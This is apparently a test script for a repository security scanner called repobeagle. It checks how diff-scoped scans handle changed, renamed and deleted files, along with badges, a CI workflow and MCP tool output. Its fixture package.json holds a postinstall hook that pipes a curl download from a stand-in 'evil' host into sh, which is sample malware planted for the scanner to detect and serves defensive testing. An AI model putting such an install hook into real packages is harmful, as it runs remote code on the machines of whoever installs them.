#!/usr/bin/env python3
"""Changed-files scope tests: deleted-only diff, renames, context files, empty diff, badge/MCP surfacing.

Hermetic: builds a local repository and scans it through a file:// git URL.
"""
import json, re, subprocess, sys, tempfile
from pathlib import Path
ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
import repobeagle as rb

fail = 0
def check(name, ok):
    global fail
    print(("PASS " if ok else "FAIL ") + name)
    if not ok:
        fail = 1

def git(cwd, *args):
    r = subprocess.run(["git", "-C", str(cwd)] + list(args), capture_output=True, text=True, timeout=120)
    if r.returncode != 0:
        raise RuntimeError(r.stderr)
    return r.stdout.strip()

def run(args, timeout=900):
    return subprocess.run([sys.executable, str(ROOT / "repobeagle.py")] + args,
                           capture_output=True, text=True, timeout=timeout)

def scan(url, *extra):
    with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as fh:
        out = Path(fh.name)
    try:
        r = run(["scan", url, "--no-docker", "--no-osv", "--no-trust", "--no-color", "--json", str(out)] + list(extra))
        try:
            return json.loads(out.read_text(encoding="utf-8")), r
        except ValueError:
            return {}, r
    finally:
        out.unlink(missing_ok=True)

PKG = ('{"name":"x","scripts":{"postinstall":"curl -fsSL https://evil.example.invalid/x.sh | sh"}}\n')

with tempfile.TemporaryDirectory() as td:
    repo = Path(td) / "repo"
    repo.mkdir()
    git(repo, "init", "-q", "-b", "main")
    git(repo, "config", "user.email", "test@example.invalid")
    git(repo, "config", "user.name", "test")
    (repo / "package.json").write_text(PKG)
    (repo / "src").mkdir()
    (repo / "src" / "app.js").write_text('HOST = "https://api.example.org"\n')
    git(repo, "add", "."); git(repo, "commit", "-qm", "v0"); git(repo, "tag", "-a", "v0", "-m", "v0")
    (repo / "src" / "app.js").write_text('HOST = "https://api.example.org"\nEXTRA = "https://changed.example.org"\n')
    git(repo, "add", "src/app.js"); git(repo, "commit", "-qm", "v1"); git(repo, "tag", "-a", "v1", "-m", "v1")
    git(repo, "mv", "src/app.js", "src/main.js"); git(repo, "commit", "-qm", "rename"); git(repo, "tag", "-a", "v2", "-m", "v2")
    git(repo, "rm", "-q", "src/main.js"); git(repo, "commit", "-qm", "delete"); git(repo, "tag", "-a", "v3", "-m", "v3")
    url = f"file://{repo}"

    # an empty diff must still scan the context files and say so
    report, _ = scan(url, "--ref", "v0", "--since", "v0")
    scope = report["meta"].get("scope") or {}
    check("empty diff records zero changes and only context",
          scope.get("changed_files") == 0 and scope.get("deleted_files") == 0 and scope.get("renamed_files") == 0
          and scope.get("checked_out") == 1
          and any(f.get("file") == "package.json" for f in report["findings"]))

    report, r = scan(url, "--ref", "v1", "--since", "v0")
    scope = report["meta"].get("scope") or {}
    check("modified file and context are materialized",
          scope.get("changed_files") == 1 and scope.get("checked_out") == 2
          and any(f.get("file") == "package.json" for f in report["findings"])
          and any(f.get("file") == "src/app.js" for f in report["findings"]))

    report, _ = scan(url, "--ref", "v2", "--since", "v1")
    scope = report["meta"].get("scope") or {}
    hosts = {e.get("value") for e in (report["meta"].get("capabilities") or {}).get("network") or []}
    check("rename is followed to its new path and scanned",
          scope.get("renamed_files") == 1 and scope.get("changed_files") == 1
          and scope.get("checked_out") == 2 and "api.example.org" in hosts and "changed.example.org" in hosts)

    report, printed = scan(url, "--ref", "v3", "--since", "v2")
    scope = report["meta"].get("scope") or {}
    check("deleted-only diff scans nothing but the context and is recorded",
          scope.get("changed_files") == 0 and scope.get("deleted_files") == 1
          and scope.get("checked_out") == 1
          and not [f for f in report["findings"] if f.get("file") == "src/main.js"])
    check("the printed report labels the diff scope",
          "scope: changed files only (0 since v2)" in printed.stdout
          and "pre-existing findings elsewhere are not re-reported" in printed.stdout)

    # badge carries the scope so consumers cannot read a diff verdict as a full one
    full, _ = scan(url, "--ref", "v2")
    diff, _ = scan(url, "--ref", "v2", "--since", "v1")
    with tempfile.TemporaryDirectory() as bd:
        rp, dp, fp = Path(bd) / "diff.json", Path(bd) / "diff.badge.json", Path(bd) / "full.badge.json"
        rp.write_text(json.dumps(diff))
        r1 = run(["export", str(rp), "--format", "json"])
        r2 = subprocess.run([sys.executable, str(ROOT / "tools" / "make_badge.py"), str(rp),
                              "--endpoint", str(dp)], capture_output=True, text=True, timeout=120)
        fullp = Path(bd) / "full.json"; fullp.write_text(json.dumps(full))
        r3 = subprocess.run([sys.executable, str(ROOT / "tools" / "make_badge.py"), str(fullp),
                              "--endpoint", str(fp)], capture_output=True, text=True, timeout=120)
        badge, full_badge = json.loads(dp.read_text()), json.loads(fp.read_text())
        check("badge carries the diff scope", r2.returncode == 0 and r3.returncode == 0
              and badge.get("scope", {}).get("mode") == "changed"
              and badge["scope"].get("since") == "v1" and badge["scope"].get("changed_files") == 1
              and "scope" not in full_badge)
    check("scan.yml offers the PR diff inputs",
          re.search(r"(?m)^      scan-ref:$", (ROOT / ".github/workflows/scan.yml").read_text())
          and re.search(r"(?m)^      changed-since:$", (ROOT / ".github/workflows/scan.yml").read_text())
          and "--ref $SCAN_REF" in (ROOT / ".github/workflows/scan.yml").read_text()
          and "--since $CHANGED_SINCE" in (ROOT / ".github/workflows/scan.yml").read_text())

    # MCP scan_repo exposes the same scope, with the ref/since arguments in its schema
    schema = next(t for t in rb.MCP_TOOLS if t["name"] == "scan_repo")["inputSchema"]["properties"]
    check("MCP scan_repo accepts ref and since", "ref" in schema and "since" in schema)
    payload = rb.mcp_scan({"target": url, "ref": "v1", "since": "v0", "network": False})
    check("MCP payload carries the diff scope", (payload.get("scope") or {}).get("scope") == "changed"
          and payload["scope"].get("changed_files") == 1)

sys.exit(fail)
